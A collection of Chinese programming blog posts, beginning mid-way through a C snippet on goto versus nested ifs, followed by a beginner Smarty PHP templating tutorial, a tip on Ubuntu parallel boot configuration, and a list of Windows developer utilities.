/* 问题： 使用goto语句是很不好的 */
int foo(int bar)
{
        if (!do_something( bar )) {
                goto error;
        }
        if (!init_stuff( bar )) {
                goto error;
        }
        if (!prepare_stuff( bar )) {
                goto error;
        }
        return do_the_thing( bar );
error:
        return 0;
}
/* 问题：太多的if嵌套了，无法阅读 */
int foo(int bar)
{
        int return_value = 0;
        if (do_something( bar )) {
                if (init_stuff( bar )) {
                        if (prepare_stuff( bar )) {
                                return_value = do_the_thing( bar );
                         }
                }
        }
        return return_value;
}
```

# 菜鸟学PHP之SMARTY入门

刚开始接触模版引擎的 PHP 设计师，听到 Smarty 时，都会觉得很难。其实笔者也不例外，碰都不敢碰一下。但是后来在剖析 XOOPS 的程序架构时，开始发现 Smarty 其实并不难。只要将 Smarty 基础功练好，在一般应用上就已经相当足够了。当然基础能打好，后面的进阶应用也就不用怕了。
　　
　　这篇文章的主要用意并非要深入探讨 Smarty 的使用，这在官方使用说明中都已经写得很完整了。笔者仅在此写下一些自己使用上的心得，让想要了解 Smarty 却不得其门而入的朋友，可以从中得到一些启示。就因为这篇文章的内容不是非常深入，会使用 Smarty 的朋友们可能会觉得简单了点。
　　
　
　　**Smarty介绍
　　
　　什么是模版引擎**
　　
　　不知道从什么时候开始，有人开始对 HTML 内嵌入 Server Script 觉得不太满意。然而不论是微软的 ASP 或是开放源码的 PHP，都是属于内嵌 Server Script 的网页伺服端语言。因此也就有人想到，如果能把程序应用逻辑 (或称商业应用逻辑) 与网页呈现 (Layout) 逻辑分离的话，是不是会比较好呢？
　　
　　其实这个问题早就存在已久，从交互式网页开始风行时，不论是 ASP 或是 PHP 的使用者都是身兼程序开发者与视觉设计师两种身份。可是通常这些使用者不是程序强就是美工强，如果要两者同时兼顾，那可得死掉不少脑细胞…
　　
　　所以模版引擎就应运而生啦！模版引擎的目的，就是要达到上述提到的逻辑分离的功能。它能让程序开发者专注于资料的控制或是功能的达成；而视觉设计师则可专注于网页排版，让网页看起来更具有专业感！因此模版引擎很适合公司的网站开发团队使用，使每个人都能发挥其专长！
　　
　　就笔者接触过的模版引擎来说，依资料呈现方式大概分成：需搭配程序处理的模版引擎和完全由模版本身自行决定的模版引擎两种形式。
　　
　　在需搭配程序处理的模版引擎中，程序开发者必须要负责变量的呈现逻辑，也就是说他必须把变量的内容在输出到模版前先处理好，才能做 assign 的工作。换句话说，程序开发者还是得多写一些程序来决定变量呈现的风貌。而完全由模版本身自行决定的模版引擎，它允许变量直接 assign 到模版中，让视觉设计师在设计模版时再决定变量要如何呈现。因此它就可能会有另一套属于自己的模版程序语法 (如 Smarty) ，以方便控制变量的呈现。但这样一来，视觉设计师也得学习如何使用模版语言。
　　
　　模版引擎的运作原理，首先我们先看看以下的运行图：
　　 　![img](http://linux.chinaitlab.com/imgfiles/2005.11.30.14.32.31.13.1.gif)
　　一般的模版引擎 (如 PHPLib) 都是在建立模版对象时取得要解析的模版，然后把变量套入后，透过 parse() 这个方法来解析模版，最后再将网页输出。
　　 　![img](http://linux.chinaitlab.com/imgfiles/2005.11.30.14.32.38.13.2.gif)
　　对 Smarty 的使用者来说，程序里也不需要做任何 parse 的动作了，这些 Smarty 自动会帮我们做。而且已经编译过的网页，如果模版没有变动的话， Smarty 就自动跳过编译的动作，直接执行编译过的网页，以节省编译的时间。
　　
　　**使用Smarty的一些概念**
　　
　　在一般模版引擎中，我们常看到区域的观念，所谓区块大概都会长成这样：
　　<!– START : Block name –>
　　区域内容
　　<!– END : Block name –>
　　
　　这些区块大部份都会在 PHP 程序中以 if 或 for, while 来控制它们的显示状态，虽然模版看起来简洁多了，但只要一换了显示方式不同的模版， PHP 程序势必要再改一次！
　　
　　在 Smarty 中，一切以变量为主，所有的呈现逻辑都让模版自行控制。因为 Smarty 会有自己的模版语言，所以不管是区块是否要显示还是要重复，都是用 Smarty 的模版语法 (if, foreach, section) 搭配变量内容作呈现。这样一来感觉上好象模版变得有点复杂，但好处是只要规划得当， PHP 程序一行都不必改。
　　
　　由上面的说明，我们可以知道使用Smarty 要掌握一个原则：将程序应用逻辑与网页呈现逻辑明确地分离。就是说 PHP 程序里不要有太多的 HTML 码。程序中只要决定好那些变量要塞到模版里，让模版自己决定该如何呈现这些变量 (甚至不出现也行) 。
　　
　　**Smarty的基础
　　
　　安装Smarty**
　　
　　首先，我们先决定程序放置的位置。
　　
　　[Windows](http://windows.chinaitlab.com/)下可能会类似这样的位置：「 d:\appserv\web\demo\ 」。
　　
　　Linux下可能会类似这样的位置：「 /home/jaceju/public_html/ 」。
　　
　　到Smarty的官方网站[下载](http://download.chinaitlab.com/)最新的Smarty套件：[http://smarty.php.net](http://smarty.php.net/)。
　　
　　解开 Smarty 2.6.0 后，会看到很多档案，其中有个 libs 资料夹。在 libs 中应该会有 3 个 class.php 檔 + 1 个 debug.tpl + 1 个 plugin 资料夹 + 1 个 core 资料夹。然后直接将 libs 复制到您的程序主资料夹下，再更名为 class 就可以了。就这样？没错！这种安装法比较简单，适合一般没有自己主机的使用者。
　　
　　至于 Smarty 官方手册中为什么要介绍一些比较复杂的安装方式呢？基本上依照官方的方式安装，可以只在主机安装一次，然后提供给该主机下所有设计者开发不同程序时直接引用，而不会重复安装太多的 Smarty 复本。而笔者所提供的方式则是适合要把程序带过来移过去的程序开发者使用，这样不用烦恼主机有没有安装 Smarty 。
　　
　　**程序的资料夹设定**
　　
　　以笔者在[Windows](http://windows.chinaitlab.com/)安装Appserv为例，程序的主资料夹是「d:\appserv\web\demo\」。安装好Smarty后，我们在主资料夹下再建立这样的资料夹：
　　 　![img](http://linux.chinaitlab.com/imgfiles/2005.11.30.14.32.46.13.3.gif)
　　在 Linux 底下，请记得将 templates_c 的权限变更为 777 。Windows 下则将其只读取消。
　　
　　**第一个用Smarty写的小程序**
　　
　　我们先设定 Smarty 的路径，请将以下这个档案命名为 main.php ，并放置到主资料夹下：
　　
　　main.php:

　　<?php

　　**include** "class/Smarty.class.php";

　　define('__SITE_ROOT', 'd:/appserv/web/demo'); // 最后没有斜线

　　**$tpl** = new Smarty();

　　**$tpl**->template_dir = __SITE_ROOT . "/templates/";

　　**$tpl**->compile_dir = __SITE_ROOT . "/templates_c/";

　　**$tpl**->config_dir = __SITE_ROOT . "/configs/";

　　**$tpl**->cache_dir = __SITE_ROOT . "/cache/";

　　**$tpl**->left_delimiter = '<{';

　　**$tpl**->right_delimiter = '}>';

　　?>

　　照上面方式设定的用意在于，程序如果要移植到其它地方，只要改 __SITE_ROOT 就可以啦。 (这里是参考 XOOPS 的 )
　　
　　Smarty 的模版路径设定好后，程序会依照这个路径来抓所有模版的相对位置 (范例中是 ‘d:/appserv/web/demo/templates/’ ) 。然后我们用 display() 这个 Smarty 方法来显示我们的模版。
　　
　　接下来我们在 templates 资料夹下放置一个 test.htm：(扩展名叫什么都无所谓，但便于视觉设计师开发，笔者都还是以 .htm 为主。)
　　
　　templates/test.htm:

　　<**html**>

　　<**head**>

　　<meta http-equiv="Content-Type" content="text/html; charset=big5">

　　<**title**><{$title}></**title**>

　　</**head**>

　　<**body**>

　　<{$content}>

　　</**body**>

　　</**html**>

　　现在我们要将上面的模版显示出来，并将网页标题 ($title) 与内容 ($content) 更换，请将以下档案内容命名为 test.php ，并放置在主资料夹下：
　　
　　test.php:

   

　　<?php

　　**require** "main.php";

　　**$tpl**->assign("title", "测试用的网页标题");

　　**$tpl**->assign("content", "测试用的网页内容");

　　// 上面两行也可以用这行代替

　　// $tpl->assign(array("title" => "测试用的网页标题", "content" => "测试用的网页内容"));

　　**$tpl**->display('test.htm');

　　?>

　　请打开浏览器，输入 http://localhost/demo/test.php 试试看(依您的环境决定网址)，应该会看到以下的画面：
　　 　![img](http://linux.chinaitlab.com/imgfiles/2005.11.30.14.32.52.13.4.gif)
　　再到 templates_c 底下，我们会看到一个奇怪的资料夹 (%%179) ，再点选下去也是一个奇怪的资料夹 (%%1798044067) ，而其中有一个档案：
　　
　　templates_c/%%179/%%1798044067/test.htm.php:

​    

　　<?php /* Smarty version 2.6.0, created on 2003-12-15 22:19:45 compiled from test.htm */ ?>

　　<**html**>

　　<**head**>

　　<meta http-equiv="Content-Type" content="text/html; charset=big5">

　　<**title**><?php echo $this->_tpl_vars['title']; ?></**title**>

　　</**head**>

　　<**body**>

　　<?php echo $this->_tpl_vars['content']; ?>

　　</**body**>

　　</**html**>

　　没错，这就是 Smarty 编译过的档案。它将我们在模版中的变量转换成了 PHP 的语法来执行，下次再读取同样的内容时， Smarty 就会直接抓取这个档案来执行了。
　　
　　最后我们整理一下整个 Smarty 程序撰写步骤：
　　
　　Step 1. 加载 Smarty 模版引擎。
　　
　　Step 2. 建立 Smarty 对象。
　　
　　Step 3. 设定 Smarty 对象的参数。
　　
　　Step 4. 在程序中处理变量后，再用 Smarty 的 assign 方法将变量置入模版里。
　　
　　Step 5. 利用 Smarty 的 display 方法将网页秀出。
　　
　　**如何安排你的程序架构**
　　
　　上面我们看到除了 Smarty 所需要的资料夹外 (class 、 configs 、 templates 、 templates_c) ，还有两个资料夹： includes 、 modules 。其实这是笔者模仿 XOOPS 的架构所建立出来的，因为 XOOPS 是笔者所接触到的程序中，少数使用 Smarty 模版引擎的架站程序。所谓西瓜偎大边，笔者这样的程序架构虽没有 XOOPS 的百分之一强，但至少给人看时还有 XOOPS 撑腰。
　　
　　includes 这个资料夹主要是用来放置一些 function 、 sql 檔，这样在 main.php 就可以将它们引入了，如下：
　　
　　main.php:
　　

　　<?php

　　**include** "class/Smarty.class.php";

　　define('__SITE_ROOT', 'd:/appserv/web/demo'); // 最后没有斜线

　　// 以 main.php 的位置为基准

　　**require_once** "includes/functions.php";

　　**require_once** "includes/include.php";

　　**$tpl** = new Smarty();

　　**$tpl**->template_dir = __SITE_ROOT . "/templates/";

　　**$tpl**->compile_dir = __SITE_ROOT . "/templates_c/";

　　**$tpl**->config_dir = __SITE_ROOT . "/configs/";

　　**$tpl**->cache_dir = __SITE_ROOT . "/cache/";

　　**$tpl**->left_delimiter = '<{';

　　**$tpl**->right_delimiter = '}>';

　　?>

　　modules 这个资料夹则是用来放置程序模块的，如此一来便不会把程序丢得到处都是，整体架构一目了然。
　　
　　上面我们也提到 main.php ，这是整个程序的主要核心，不论是常数定义、外部程序加载、共享变量建立等，都是在这里开始的。所以之后的模块都只要将这个档案包含进来就可以啦。因此在程序流程规划期间，就必须好好构思 main.php 中应该要放那些东西；当然利用 include 或 require 指令，把每个环节清楚分离是再好不过了。
　　 　![img](http://linux.chinaitlab.com/imgfiles/2005.11.30.14.32.59.13.5.gif)
　　在上节提到的 Smarty 程序 5 步骤， main.php 就会帮我们先将前 3 个步骤做好，后面的模块程序只要做后面两个步骤就可以了。
　　
　　**从变量开始**
　　
　　如何使用变量
　　
　　从上一章范例中，我们可以清楚地看到我们利用 <{ 及 }> 这两个标示符号将变量包起来。预设的标示符号为 { 及 } ，但为了中文冲码及 [Java](http://java.chinaitlab.com/)script 的关系，因此笔者还是模仿 XOOPS ，将标示符号换掉。变量的命名方式和 PHP 的变量命名方式是一模一样的，前面也有个 $ 字号 (这和一般的模版引擎不同)。标示符号就有点像是 PHP 中的 <?php 及 ?> (事实上它们的确会被替换成这个) ，所以以下的模版变量写法都是可行的：
　　

　　1. <{$var}>

　　

　　2. <{ $var }> <!– 和变量之间有空格 –>

　　

　　3. <{$var

　　
　　}> <!– 启始的标示符号和结束的标示符号不在同一行 –>
　　在 Smarty 里，变量预设是全域的，也就是说你只要指定一次就好了。指定两次以上的话，变量内容会以最后指定的为主。就算我们在主模版中加载了外部的子模版，子模版中同样的变量一样也会被替代，这样我们就不用再针对子模版再做一次解析的动作。
　　
　　而在 PHP 程序中，我们用 Smarty 的 assign 来将变量置放到模版中。 assign 的用法官方手册中已经写得很多了，用法就如同上一节的范例所示。不过在重复区块时，我们就必须将变量做一些手脚后，才能将变量 assign 到模版中，这在下一章再提。
　　
　　**修饰你的变量**
　　
　　上面我们提到 Smarty 变量呈现的风貌是由模版自行决定的，所以 Smarty 提供了许多修饰变量的函式。使用的方法如下：
　　
　　<{变量|修饰函式}> <!– 当修饰函式没有参数时 –>
　　
　　<{变量|修饰函式:”参数(非必要，视函式而定)”}> <!– 当修饰函式有参数时 –>
　　范例如下：
　　
　　<{$var|nl2br}> <!– 将变量中的换行字符换成 <br /> –>
　　
　　<{$var|string_format:”%02d”}> <!– 将变量格式化 –>
　　好，那为什么要让模版自行决定变量呈现的风貌？先看看底下的 HTML ，这是某个购物车结帐的部份画面。
　　
　　<input name=”total” type=”hidden” value=”21000″ />
　　
　　总金额：21,000 元
　　一般模版引擎的模版可能会这样写：
　　
　　<input name=”total” type=”hidden” value=”{total}” />
　　
　　总金额：{format_total} 元
　　它们的 PHP 程序中要这样写：
　　

　　<?php

　　**$total** = 21000;

　　**$tpl**->assign("total", **$total**);

　　**$tpl**->assign("format_total", number_format(**$total**));

　　?>

　　而 Smarty 的模版就可以这样写： (number_format 修饰函式请到Smarty 官方网页[下载](http://download.chinaitlab.com/))
　　
　　<input name=”total” type=”hidden” value=”<{$total}>” />
　　
　　总金额：<{$total|number_format:””}> 元
　　Smarty 的 PHP 程序中只要这样写：
　　

　　<?php

　　**$total** = 21000;

　　**$tpl**->assign("total", **$total**);

　　?>

　　所以在 Smarty 中我们只要指定一次变量，剩下的交给模版自行决定即可。这样了解了吗？这就是让模版自行决定变量呈现风貌的好处！
　　
　　**控制模版的内容
　　
　　重复的区块**
　　
　　在 Smarty 样板中，我们要重复一个区块有两种方式： foreach 及 section 。而在程序中我们则要 assign 一个数组，这个数组中可以包含数组数组。就像下面这个例子：
　　
　　首先我们来看 PHP 程序是如何写的：
　　
　　test2.php:
　　

　　<?php

　　**require** "main.php";

　　**$array1** = **array**(1 => "苹果", 2 => "菠萝", 3 => "香蕉", 4 => "芭乐");

　　**$tpl**->assign("array1", **$array1**);

　　**$array2** = **array**(

　　**array**("index1" => "data1-1", "index2" => "data1-2", "index3" => "data1-3"),

　　**array**("index1" => "data2-1", "index2" => "data2-2", "index3" => "data2-3"),

　　**array**("index1" => "data3-1", "index2" => "data3-2", "index3" => "data3-3"),

　　**array**("index1" => "data4-1", "index2" => "data4-2", "index3" => "data4-3"),

　　**array**("index1" => "data5-1", "index2" => "data5-2", "index3" => "data5-3"));

　　**$tpl**->assign("array2", **$array2**);

　　**$tpl**->display("test2.htm");

　　?>

　　而模版的写法如下：
　　
　　templates/test2.htm:
　　

　　<**html**>

　　<**head**>

　　<meta http-equiv="Content-Type" content="text/html; charset=big5">

　　<**title**>测试重复区块</**title**>

　　</**head**>

　　<**body**>

　　

<pre>

　　利用 foreach 来呈现 array1

　　<{foreach item=item1 from=$array1}>

　　<{$item1}>

　　<{/foreach}>

　　利用 section 来呈现 array1

　　<{section name=sec1 loop=$array1}>

　　<{$array1[sec1]}>

　　<{/section}>

　　利用 foreach 来呈现 array2

　　<{foreach item=index2 from=$array2}>

　　<{foreach key=key2 item=item2 from=$index2}>

　　<{$key2}>: <{$item2}>

　　<{/foreach}>

　　<{/foreach}>

　　利用 section 来呈现 array1

　　<{section name=sec2 loop=$array2}>

　　index1: <{$array2[sec2].index1}>

　　index2: <{$array2[sec2].index2}>

　　index3: <{$array2[sec2].index3}>

　　<{/section}>

　　</**pre**>

　　</**body**>

　　</**html**>

　　执行上例后，我们发现不管是 foreach 或 section 两个执行结果是一样的。那么两者到底有何不同呢？
　　
　　第一个差别很明显，就是foreach 要以巢状处理的方式来呈现我们所 assign 的两层数组变量，而 section 则以「主数组[循环名称].子数组索引」即可将整个数组呈现出来。由此可知， Smarty 在模版中的 foreach 和 PHP 中的 foreach 是一样的；而 section 则是 Smarty 为了处理如上列的数组变量所发展出来的叙述。当然 section 的功能还不只如此，除了下一节所谈到的巢状资料呈现外，官方手册中也提供了好几个 section 的应用范例。
　　
　　不过要注意的是，丢给 section 的数组索引必须是从 0 开始的正整数，即 0, 1, 2, 3, …。如果您的数组索引不是从 0 开始的正整数，那么就得改用 foreach 来呈现您的资料。您可以参考官方讨论区中的此篇讨论，其中探讨了 section 和 foreach 的用法。
　　
　　**巢状资料的呈现**
　　
　　模版引擎里最令人伤脑筋的大概就是巢状资料的呈现吧，许多著名的模版引擎都会特意强调这点，不过这对 Smarty 来说却是小儿科。
　　
　　最常见到的巢状资料，就算论譠程序中的讨论主题区吧。假设要呈现的结果如下：
　　
　　公告区
　　
　　站务公告
　　
　　文学专区
　　
　　好书介绍
　　
　　奇文共赏
　　
　　计算机专区
　　
　　硬件外围
　　
　　软件讨论
　　
　　程序中我们先以静态资料为例：
　　
　　test3.php:
　　

　　<?php

　　**require** "main.php";

　　**$forum** = **array**(

　　**array**("category_id" => 1, "category_name" => "公告区",

　　"topic" => **array**(

　　**array**("topic_id" => 1, "topic_name" => "站务公告")

　　)

　　),

　　**array**("category_id" => 2, "category_name" => "文学专区",

　　"topic" => **array**(

　　**array**("topic_id" => 2, "topic_name" => "好书介绍"),

　　**array**("topic_id" => 3, "topic_name" => "奇文共赏")

　　)

　　),

　　**array**("category_id" => 3, "category_name" => "计算机专区",

　　"topic" => **array**(

　　**array**("topic_id" => 4, "topic_name" => "硬件外围"),

　　**array**("topic_id" => 5, "topic_name" => "软件讨论")

　　)

　　)

　　);

　　**$tpl**->assign("forum", **$forum**);

　　**$tpl**->display("test3.htm");

　　?>

　　模版的写法如下：
　　
　　templates/test3.htm:
　　

　　<html>　　<head>　　<title>巢状循环测试</title>　　</head>　　<body>　　<table width="200" border="0" align="center" cellpadding="3" cellspacing="0">　　<{section name=sec1 loop=$forum}>　　<tr>　　<td colspan="2"><{$forum[sec1].category_name}></td>　　</tr>　　<{section name=sec2 loop=$forum[sec1].topic}>　　<tr>　　<td width="25"></td>　　<td width="164"><{$forum[sec1].topic[sec2].topic_name}></td>　　</tr>　　<{/section}>　　<{/section}>　　</table>　　</body>　　</html>

　　执行的结果就像笔者举的例子一样。
　　
　　因此呢，在程序中我们只要想办法把所要重复值一层一层的塞到数组中，再利用 <{第一层数组[循环1].第二层数组[循环2].第三层数组[循环3]. … .数组索引}> 这样的方式来显示每一个巢状循环中的值。至于用什么方法呢？下一节使用数据库时我们再提。
　　
　　**转换数据库中的资料**
　　
　　上面提到如何显示巢状循环，而实际上应用时我们的资料可能是从数据库中抓取出来的，所以我们就得想办法把数据库的资料变成上述的多重数组的形式。这里笔者用一个 DB 类别来抓取数据库中的资料，您可以自行用您喜欢的方法。
　　
　　我们只修改 PHP 程序，模版还是上面那个 (这就是模版引擎的好处~)，其中 $db 这个对象假设已经在 main.php 中建立好了，而且抓出来的资料就是上面的例子。
　　
　　test3.php:
　　

　　<?php

　　**require** "main.php";

　　// 先建立第一层数组

　　**$category** = **array**();

　　**$db**->set<span **class**="t_tag">SQL</span>(**$SQL1,** 'CATEGORY');

　　**if** (!**$db**->query('CATEGORY')) **die**(**$db**->error());

　　// 抓取第一层循环的资料

　　**while** (**$item_category** = **$db**->fetchAssoc('CATEGORY'))

　　{

　　// 建立第二层数组

　　**$topic** = **array**();

　　**$db**->setSQL(sprintf(**$SQL2,** **$item_category[**'category_id']), 'TOPIC');

　　**if** (!**$db**->query('TOPIC')) **die**(**$db**->error());

　　// 抓取第二层循环的资料

　　**while** (**$item_topic** = **$db**->fetchAssoc('TOPIC'))

　　{

　　// 把抓取的数据推入第二层数组中

　　array_push(**$topic,** **$item_topic**);

　　}

　　// 把第二层数组指定为第一层数组所抓取的数据中的一个成员

　　**$item_category[**'topic'] = **$topic**;

　　// 把第一层数据推入第一层数组中

　　array_push(**$category,** **$item_category**);

　　}

　　**$tpl**->assign("forum", **$category**);

　　**$tpl**->display("test3.htm");

　　?>

　　在数据库抓取一笔资料后，我们得到的是一个包含该笔数据的数组。透过 while 叙述及 array_push 函式，我们将数据库中的资料一笔一笔塞到数组里。如果您只用到单层循环，就把第二层循环 (红色的部份) 去掉即可。
　　
　　**决定内容是否显示**
　　
　　要决定是否显示内容，我们可以使用 if 这个语法来做选择。例如如果使用者已经登入的话，我们的模版就可以这样写：
　　
　　<{if $is_login == true}>
　　显示使用者操作选单
　　<{else}>
　　显示输入帐号和密码的窗体
　　<{/if}>
　　
　　要注意的是，「==」号两边一定要各留至少一个空格符，否则 Smarty 会无法解析。
　　
　　if 语法一般的应用可以参照官方使用说明，所以笔者在这里就不详加介绍了。不过笔者发现了一个有趣的应用：常常会看到程序里要产生这样的一个表格： (数字代表的是资料集的顺序)
　　
　　1 2
　　
　　3 4
　　
　　5 6
　　
　　7 8
　　
　　这个笔者称之为「横向重复表格」。它的特色和传统的纵向重复不同，前几节我们看到的重复表格都是从上而下，一列只有一笔资料。而横向重复表格则可以横向地在一列中产生 n 笔资料后，再换下一列，直到整个循环结束。要达到这样的功能，最简单的方式只需要 section 和 if 搭配即可。
　　
　　我们来看看下面这个例子：
　　
　　test4.php:
　　

　　<?php

　　**require** "main.php";

　　**$my_array** = **array**(

　　**array**("value" => "0"),

　　**array**("value" => "1"),

　　**array**("value" => "2"),

　　**array**("value" => "3"),

　　**array**("value" => "4"),

　　**array**("value" => "5"),

　　**array**("value" => "6"),

　　**array**("value" => "7"),

　　**array**("value" => "8"),

　　**array**("value" => "9"));

　　**$tpl**->assign("my_array", **$my_array**);

　　**$tpl**->display('test4.htm');

　　?>

　　模版的写法如下：
　　
　　templates/test4.htm:
　　

　　<html>　　<head>　　<title>横向重复表格测试</title>　　</head>　　<body>　　<table width="500" border="1" cellspacing="0" cellpadding="3">　　<tr>　　<{section name=sec1 loop=$my_array}>　　<td><{$my_array[sec1].value}></td>　　<{if $smarty.section.sec1.rownum is div by 2}>　　</tr>　　<tr>　　<{/if}>　　<{/section}>　　</tr>　　</table>　　</body>　　</html>

　　重点在于 $smarty.section.sec1.rownum 这个 Smarty 变量，在 section 循环中这个变量会取得从 1 开始的索引值，所以当 rownum 能被 2 除尽时，就输出 </tr><tr> 使表格换列 (注意！是 </tr> 在前面<tr> 在后面) 。因此数字 2 就是我们在一列中想要呈现的资料笔数。各位可以由此去变化其它不同的呈现方式。
　　
　　**加载外部内容**
　　
　　我们可以在模版内加载 PHP 程序代码或是另一个子模版，分别是使用 include_php 及 include 这两个 Smarty 模版语法； include_php 笔者较少用，使用方式可以查询官方手册，这里不再叙述。
　　
　　在使用 include 时，我们可以预先加载子模版，或是动态加载子模版。预先加载通常使用在有共同的文件标头及版权宣告；而动态加载则可以用在统一的框架页，而进一步达到如 Winamp 般可换 Skin 。当然这两种我们也可以混用，视状况而定。
　　
　　我们来看看下面这个例子：
　　
　　test5.php:
　　

　　<?php

　　**require** "main.php";

　　**$tpl**->assign("title", "Include 测试");

　　**$tpl**->assign("content", "这是模版 2 中的变量");

　　**$tpl**->assign("dyn_page", "test5_3.htm");

　　**$tpl**->display('test5_1.htm');

　　?>

　　模版 1 的写法如下：
　　
　　templates/test5_1.htm:
　　

　　<**html**>

　　<**head**>

　　<meta http-equiv="Content-Type" content="text/html; charset=big5">

　　<**title**><{$title}></**title**>

　　</**head**>

　　<**body**>

　　<{include file="test5_2.htm"}>

　　<{include file=$dyn_page}>

　　<{include file="test5_4.htm" custom_var="自订变量的内容"}>

　　</**body**>

　　</**html**>

　　模版 2 的写法如下：
　　
　　templates/test5_2.htm:
　　
　　<{$content}>
　　模版 3 的写法如下：
　　
　　templates/test5_3.htm:
　　
　　这是模版 3 的内容
　　模版 4 的写法如下：
　　
　　templates/test5_4.htm:
　　
　　<{$custom_var}>

　　这里注意几个重点：1. 模版的位置都是以先前定义的 template_dir 为基准；2. 所有 include 进来的子模版中，其变量也会被解译。；3. include 中可以用「变量名称=变量内容」来指定引含进来的模版中所包含的变量，如同上面模版 4 的做法。

# UBUNTU的并行启动

如果你在使用多核处理器，那么你可以配置Ubuntu的一个参数来使用Ubuntu的启动并行，以加快其启动速度。

这个参数在文件*/etc/init.d/rc*中，其参数名是CONCURRENCY默认值是none，你可以把这个参数改成如下所示。于是，你就开启了Ubuntu的并行启动的功能。

CONCURRENCY=shell

但是，这个参数会导致dbus, hal和gdm的产生“race condition”竞争条件，所以，这三个程序的启动顺序非常的关键。其必需保证这个顺序：dbus -> hal -> gdm。这个顺序在Ubuntu的Hardy，Intrepid 或Jaunty中是没有问题的。但是，我们不排除在别的版本中会有问题。



所以，在开启“并行启动”时，你需要去检查一下dbus，hal和gdm的启动顺序，其启动顺序你可以在*/etc/rc2.d/*目录下，查看一个这三个程序的S后面的编号顺序。如果你看到下面的这个顺序，那么你就需要做出调整了。

s12dbus
s13gdm
s24hal

调整也很简单，就是改一下S后面的数字就行了，如下所示：

*mv s24hal s13hal*
*mv s13gdm s14gdm*

关于更多详细的情况，请查看这个[BUG报告](https://bugs.launchpad.net/ubuntu/+source/hal/+bug/149881) 。

# WINDOWS下和程序员相关小工具

[1 HOUR SOFTWARE](https://www.donationcoder.com/Software/Skrommel/index.html) – 很多的小工具集

[.NET Memory Profiler](http://memprofiler.com/) – 可以找出.NET程序中的内存泄露问题，并找出可优化的内存。

[.NET Reflector](http://www.aisto.com/roeder/dotnet/) – 查看，导航，搜索.NET汇编中的类的继承关系。

[Active Webcam](http://www.pysoft.com/ActiveWebCamMainpage.htm) – Webcam 视频监视软件。

[ArsClip](http://www.joejoesoft.com/cms/showpage.php?cid=97) – 剪贴版管理程序，可以跟踪每次剪贴版中的内容，并可以通过设置热键，取出粘贴其中的内容。

[ASP2ASPX](http://www.netcoole.com/asp2aspx.htm) – 转换ASP 程序页到ASP.NET

[AutoHotKey](http://www.autohotkey.com/) – 自动点击键盘和鼠标。



[Awave Studio](http://www.fmjsoft.com/awframe.html) – 几乎是所有的音频格式的转换程序。

[Batch files](http://www.bookcase.com/library/software/msdos.util.batch.html) – 想要不同功能的bat文件吗？这个站点集成了很多功能强大的bat文件。

[BartPE](http://www.nu2.nu/pebuilder/) – 制作一张可以启动的Windows CD/DVD

[Beyond Compare](http://www.scootersoftware.com/) – 快速容易地比较和合并本地，远程或FTP服务器上的文件和目录。

[BitPim](http://www.bitpim.org/) – 可以查看并操作绝大多数的 CDMA 手机

[Bullzip PDF Printer](http://www.bullzip.com/products/pdf/info.php) – PDF文件打印机程序。

[Cain & Abel](http://www.oxid.it/cain.html) – 口令恢复工具。（可以用作正常和不正常的情况）

[Camtasia Studio](http://www.techsmith.com/camtasia.asp) – 屏幕录像工具。

[C# Programming Tools](http://msdn2.microsoft.com/en-us/vcsharp/aa336818.aspx) – C# 开发工具

[CCleaner](https://www.ccleaner.com/) – 系统优化，隐私和清理工具。

[Cisco VPN Clients](http://ftp.uma.es/ClientesVPN/?C=M;O=A) – Cisco VPN客户端。

[Clone Detective](https://clonedetectivevs.codeplex.com/) – 这是一个集成到Visual Studio 中，允许你分析自己的C# projects 中是否有重复的代码，以便你重构你的代码。

[CodeSmith](http://www.codesmithtools.com/) – 代码生成器，可惜是收费的。

[Commit Monitor](http://tools.tortoisesvn.net/CommitMonitor) – 一个任务栏中的小监视器，当 subversion 的源代码被别人更新过了，他可以通知你。

[Consolas Font Pack](https://www.microsoft.com/downloads/details.aspx?familyid=22e69ae4-7e40-4807-8a86-b3d36fab68d3&displaylang=en) – 终级的程序字体。（VS2005）

[CurrPorts](https://www.nirsoft.net/utils/cports.html) – 把所有打开的 TCP/IP 和UDP 端口都列出来。

[DAEMON Tools Lite](http://www.daemon-tools.cc/dtcc/download.php?mode=ViewCategory&catid=5) – 大名鼎鼎的超轻量级的虚拟光驱程序。

[DialAFix](https://wiki.lunarsoft.net/wiki/Dial-a-fix) – 可以修复很多不同的Windows 问题的小工具。

[DiskAction](http://www.pcmag.com/article2/0,2817,1944519,00.asp) – 查看目前的进程是怎么在存取你的硬盘的。

[DoubleKiller](http://www.bigbangenterprises.de/en/doublekiller) – 查找相同的文件，并保留其中的一份。

[Doxygen](https://www.stack.nl/~dimitri/doxygen/) – 一个通过程序注释创建程序文档的工具，非常有用。

[DriverMax](http://www.innovative-sol.com/drivermax/) – 导出所有驱动器的数据到一个目录或一个压缩文件中。

[Debug Inspector](http://www.debuginspector.com/index.htm) – 在多线程中，可以同时看到各个线程的函数调用栈。并可以检测死锁。

[EAC](http://www.exactaudiocopy.de/) – 从CD或DVD中捕捉音视的程序。

[Eraser](http://www.heidi.ie/node/14) – 彻底地删文件，删除文件后，在原来分配给文件的硬盘上写上一些随机的字符。

[EVEREST](http://www.lavalys.com/) – PC 诊断和benchmark的工具。

[Fiddler](http://www.fiddlertool.com/fiddler/version.asp) – Web 调试代理。

[FILEACL](http://www.gbordier.com/) – NTFS 权限管理工具。

[FileMenu Tools](http://www.lopesoft.com/en/fmtools/info.html) – Explorer 的右键菜单管理工具。

[FileZilla](https://filezilla-project.org/) – 鼎鼎大名的FTP/FTPS/SFTP 客户端。

[FireBug](https://addons.mozilla.org/en-US/firefox/addon/1843/) – 在Firefox中调试JavaScript。

[FireFTP](http://fireftp.mozdev.org/) – Firefox的FTP 客户端。

[Fortres 101](http://www.fortresgrand.com/products/f101/f101.htm) – 桌面安全软件。

[FSUM](http://www.slavasoft.com/fsum/) – 一个验证文件完整性的命令行工具。

[FxCop](https://www.microsoft.com/downloads/details.aspx?FamilyID=9aeaa970-f281-4fb0-aba1-d59d7ed09772&DisplayLang=en) – .NET 源码分析工具。

[GetRight](http://getright.com/) – 一个非常优秀的下载管理器。

[Hamachi](https://secure.logmein.com/products/hamachi/vpn.asp) – 可以提供一个VPN 服务。设置起来非常简单，只需要10分钟，然后你就可以通过internet连入你的公司或家里了。

[hMailServer](https://www.hmailserver.com/) – 免费的邮件服务器。

[HTTP Analyzer](http://www.ieinspector.com/httpanalyzer/) – 实时监控，跟踪，调试，并分析 HTTP/HTTPS 的访问。

[httpZip](http://www.port80software.com/products/httpzip/) – 基于IIS 4, 5, 和6.0 的ISAPI。

